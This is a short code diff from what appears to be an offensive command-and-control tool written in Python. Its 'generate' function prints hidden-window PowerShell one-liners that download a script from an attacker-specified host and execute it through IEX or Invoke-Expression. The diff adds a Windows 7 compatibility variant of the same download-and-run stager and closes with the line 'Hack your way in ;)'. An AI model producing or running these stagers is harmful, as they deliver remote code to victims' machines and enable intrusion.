@@ -180,6 +180,8 @@ def generate(hostname, path, proto, interval):
     print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
     print(("2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
     print(("3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(hostname, path, proto, c)))
+    print("Note - For Windows 7 clients you may need to prefix the payload with " + '"Add-Type -AssemblyName System.Core;"')
+    print(("       e.g. powershell -w hidden " + '"Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
     print("Hack your way in ;)")
     print((colored("#====================", "red")))
 
